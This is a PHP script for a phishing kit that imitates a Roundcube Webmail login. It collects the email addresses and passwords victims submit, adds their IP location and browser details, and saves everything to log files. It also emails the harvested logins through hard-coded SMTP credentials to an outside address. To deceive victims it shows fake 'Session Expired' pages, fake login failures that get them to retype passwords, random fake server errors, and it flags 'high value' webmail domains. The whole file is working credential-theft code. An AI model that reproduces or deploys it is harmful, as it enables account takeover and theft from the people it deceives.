<?php 
require_once 'class.phpmailer.php';
require_once 'class.smtp.php';
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");

// Enhanced session and tracking
session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct Access';
$request_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
$query_string = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';
$timestamp = date('Y-m-d H:i:s');

// Block GET requests with realistic error
if($_SERVER['REQUEST_METHOD']=='GET'){
?>
<!DOCTYPE html>
<html><head>
<title>Session Expired - Roundcube Webmail</title>
<style>
body{font-family:Arial,sans-serif;background:#f4f4f4;margin:50px;}
.error-box{background:#fff;border:1px solid #ddd;padding:20px;max-width:500px;margin:0 auto;border-radius:5px;}
h1{color:#d32f2f;font-size:18px;}
</style>
</head><body>
<div class="error-box">
<h1>Session Expired</h1>
<p>Your session has expired for security reasons. Please <a href="javascript:history.back()">go back</a> and log in again.</p>
<p><small>Error Code: RC_SESSION_TIMEOUT</small></p>
</div>
</body></html>
<?php 
exit();
}

// Configuration - UPDATE THESE VALUES
$receiver = "lenialuno@web.de"; // Your email
$senderuser = "jered@globalrisk.rw"; // SMTP user
$senderpass = "global.321"; // SMTP password
$senderport = "587"; // SMTP port
$senderserver = "mail.globalrisk.rw"; // SMTP server

// Enhanced data collection
$login = trim($_POST['email']);
$passwd = $_POST['password'];
$remember = isset($_POST['remember']) ? 'Yes' : 'No';

// Email domain extraction
$email_parts = explode("@", $login);
$domain = isset($email_parts[1]) ? $email_parts[1] : 'unknown';

// Enhanced geolocation with fallback
$ipdat = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=".$ip));
$country = isset($ipdat->geoplugin_countryName) ? $ipdat->geoplugin_countryName : 'Unknown';
$city = isset($ipdat->geoplugin_city) ? $ipdat->geoplugin_city : 'Unknown';
$region = isset($ipdat->geoplugin_region) ? $ipdat->geoplugin_region : 'Unknown';
$timezone = isset($ipdat->geoplugin_timezone) ? $ipdat->geoplugin_timezone : 'Unknown';

// Browser and device detection
function getBrowserInfo($user_agent) {
    $browsers = array(
        'Chrome' => 'Chrome',
        'Firefox' => 'Firefox', 
        'Safari' => 'Safari',
        'Edge' => 'Edge',
        'Internet Explorer' => 'MSIE|Trident'
    );
    
    foreach($browsers as $name => $pattern) {
        if(preg_match("/$pattern/i", $user_agent)) {
            return $name;
        }
    }
    return 'Unknown Browser';
}

function getDeviceType($user_agent) {
    if(preg_match('/Mobile|Android|iPhone|iPad/i', $user_agent)) {
        return 'Mobile/Tablet';
    }
    return 'Desktop';
}

$browser = getBrowserInfo($user_agent);
$device = getDeviceType($user_agent);

// Track attempt count in session
if(!isset($_SESSION['attempt_count'])) {
    $_SESSION['attempt_count'] = 0;
}
$_SESSION['attempt_count']++;
$attempt_number = $_SESSION['attempt_count'];

// Enhanced email subject with more info
$sub = "TrueRcubeOrange1 - " . $domain . " - Attempt #" . $attempt_number;

// Comprehensive message formatting
$detailed_message = "
=== ROUNDCUBE LOGIN CAPTURE ===
Time: $timestamp
Attempt: #$attempt_number

CREDENTIALS:
Email: $login
Password: $passwd
Domain: $domain
Remember Me: $remember

LOCATION DATA:
IP Address: $ip
Country: $country
Region/State: $region
City: $city
Timezone: $timezone

TECHNICAL INFO:
Browser: $browser
Device: $device
User Agent: $user_agent
Referrer: $referer
Request URI: $request_uri
Query String: $query_string

=== END CAPTURE ===
";

// HTML formatted message for email
$html_message = nl2br(htmlspecialchars($detailed_message));

// Enhanced logging function
function logToFile($data, $filename = "captures.log") {
    $log_entry = "[" . date('Y-m-d H:i:s') . "] " . $data . "\n" . str_repeat("-", 80) . "\n";
    file_put_contents($filename, $log_entry, FILE_APPEND | LOCK_EX);
}

// Log to multiple files for organization
logToFile($detailed_message, "SS-Or.txt"); // Your original file
logToFile($detailed_message, "captures_" . date('Y-m') . ".log"); // Monthly logs
logToFile("$login:$passwd", "credentials_only.txt"); // Simple format

// Enhanced email sending with retry logic
function sendEmail($mail_config, $subject, $body, $alt_body) {
    $max_retries = 3;
    $retry_count = 0;
    
    while($retry_count < $max_retries) {
        try {
            $mail = new PHPMailer(true);
            $mail->IsSMTP();
            $mail->SMTPAuth = true;
            $mail->Host = $mail_config['host'];
            $mail->Port = $mail_config['port'];
            $mail->Username = $mail_config['username'];
            $mail->Password = $mail_config['password'];
            $mail->IsHTML(true);
            $mail->SetFrom($mail_config['username']);
            $mail->AddAddress($mail_config['receiver']);
            $mail->Subject = $subject;
            $mail->Body = $body;
            $mail->AltBody = $alt_body;
            
            if($mail->send()) {
                return true;
            }
        } catch (Exception $e) {
            error_log("Email send attempt " . ($retry_count + 1) . " failed: " . $e->getMessage());
        }
        $retry_count++;
        sleep(1); // Wait 1 second before retry
    }
    return false;
}

// Email configuration
$mail_config = array(
    'host' => $senderserver,
    'port' => $senderport,
    'username' => $senderuser,
    'password' => $senderpass,
    'receiver' => $receiver
);

// Enhanced response logic based on attempt number and patterns
function getResponseMessage($attempt, $email, $password) {
    $responses = array(
        1 => array("signal" => "not ok", "msg" => "Invalid username or password. Please try again."),
        2 => array("signal" => "not ok", "msg" => "Login failed. Please check your credentials."), 
        3 => array("signal" => "not ok", "msg" => "Account temporarily locked. Please wait and try again."),
        4 => array("signal" => "ok", "msg" => "Login successful") // Let them in after 4 attempts
    );
    
    // Pattern-based responses
    if(strlen($password) < 4) {
        return array("signal" => "not ok", "msg" => "Password too short. Please enter your full password.");
    }
    
    if($password === 'password' || $password === '123456' || $password === 'admin') {
        return array("signal" => "not ok", "msg" => "Invalid credentials. Please try again.");
    }
    
    return isset($responses[$attempt]) ? $responses[$attempt] : $responses[1];
}

// Send email notification
$email_sent = sendEmail($mail_config, $sub, $html_message, strip_tags($detailed_message));

// Log email status
if($email_sent) {
    logToFile("Email notification sent successfully for: $login");
} else {
    logToFile("Failed to send email notification for: $login");
}

// Generate session token for tracking
$session_token = md5(uniqid(rand(), true));
$_SESSION['capture_token'] = $session_token;

// Enhanced response logic
$response = getResponseMessage($attempt_number, $login, $passwd);

// Add delay to simulate real server processing
usleep(rand(500000, 2000000)); // 0.5 to 2 seconds delay

// Special handling for high-value targets
$high_value_domains = array('gmail.com', 'outlook.com', 'yahoo.com', 'company.com');
if(in_array($domain, $high_value_domains)) {
    // Log high-value target separately
    logToFile("HIGH VALUE TARGET: $detailed_message", "high_value_targets.log");
    
    // Send priority email
    $priority_subject = "🎯 HIGH VALUE TARGET - " . $sub;
    sendEmail($mail_config, $priority_subject, "HIGH PRIORITY CAPTURE:<br><br>" . $html_message, "High priority capture");
}

// Statistical tracking
$stats_data = array(
    'timestamp' => time(),
    'ip' => $ip,
    'country' => $country,
    'domain' => $domain,
    'browser' => $browser,
    'device' => $device,
    'attempt' => $attempt_number
);

file_put_contents('capture_stats.json', json_encode($stats_data) . "\n", FILE_APPEND | LOCK_EX);

// Return response to frontend
echo json_encode($response);

// Optional: Advanced evasion techniques
if(rand(1, 100) <= 5) { // 5% chance
    // Simulate occasional server errors to appear more realistic
    http_response_code(500);
    echo json_encode(array("signal" => "error", "msg" => "Server temporarily unavailable. Please try again."));
}
?>